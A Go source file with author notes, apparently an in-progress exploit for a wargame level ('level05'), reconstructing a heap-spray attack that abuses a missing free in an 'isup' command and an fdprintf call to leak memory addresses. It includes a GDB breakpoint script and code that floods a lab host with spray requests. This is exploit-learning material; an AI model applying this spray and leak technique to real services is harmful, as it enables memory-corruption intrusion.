/* notes:

After the interestingly failed attempt where checkname can be used
divulge bytes on the stack in specific conditions, the internet put me
straight for one last time. This time howeve, the convolution-level of
our attacks are not going to be astronomically hard to implement.

This time we're basically reconstructing the attack of ArielKoren.

Koren's attack is based on the lack of a free in a call to isup, which
allows for us to bloat the heap, and to a more leniant degree, aim and
furthermore shoot at a memory location, hoping to land somewhere in
our buffer.

Landing in this case means that we abuse the fdprintf function to
simply send some data to us which will include a pointer, leaking the
memory mapping.

GDB'ing the process and sending checkname @*256, I was presented with the following initial view of the state of fdprintf.

```
0xb78c46aa in fdprintf (fd=-1215534850, fmt=0xb93e0860 '@' <repeats 200 times>...) at level05/level05.c:27
```


---

Given a sprayed heap, and as ArielKorel described, a call with generous amounts of bytes passed to checkname, fdprintf will be called in a wierd way.

=== gdb lazy file ===
set pagination off
set disassembly-flavor intel

# ret@checkname
break *checkname+132
commands
 i r esp
end

# ret@get_and_hash
break *get_and_hash+145
 commands i r esp
end

break *fdprintf

define xxd
 dump binary memory dump.bin $arg0 $arg0+$arg1
 shell xxd dump.bin
 shell rm dump.bin
end

printf "base addresses: "
info proc mappings

c
---
*/

package main

import (
	"time"
	"io"
	"net"
	"fmt"
	"log"
)

var interactive = false
var registrations = make([]string,128)

func sploit(conn net.Conn) {
	const max = 0x100000
	fmt.Println("spraying!")
	b := "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
		"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	for i := 0; i < max; i++ {
		if i % 1024 == 0 {
			fmt.Printf("%d / %d\n",i,max)
		}
		isup(conn,b)
	}
}

func read(conn net.Conn) string {
	buf := make([]byte, 4096)
	tmp := make([]byte, 8)
	for {
		err := conn.SetReadDeadline(time.Now().Add(time.Millisecond * 200))
		check("main,SetReadDeadline",err)
		n, err := conn.Read(tmp)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			if err != io.EOF {
				fmt.Printf("main,Read: %s\n",err)
			}
			break
		}
		buf = append(buf,tmp[:n]...) 
	}
	
	if len(string(buf)) > 0 {
		return fmt.Sprintf("%s",buf)
	} else {
		return ""
	}
}

func isup(conn net.Conn, name string) {
	_, err := fmt.Fprintf(conn,fmt.Sprintf("isup %s 8000\n",name))
	check("isup",err)
}

func checkname(conn net.Conn, name string) {
	//h := hash([]byte(name),len(name))
	//fmt.Printf("[checkname] name{%s} generated index{%d}\n",name,h)
	_, err := fmt.Fprintf(conn, "checkname %s\n",name)
	check("checkname",err)
}

func check(where string, err error) {
	if err != nil {
		log.Fatalf("[%s] - %s\n",where,err)
	}
}

func main() {
	conn, err := net.Dial("tcp","10.11.11.6:20005")
	check("main,net.Dial",err)
	defer conn.Close()

	sploit(conn)
}
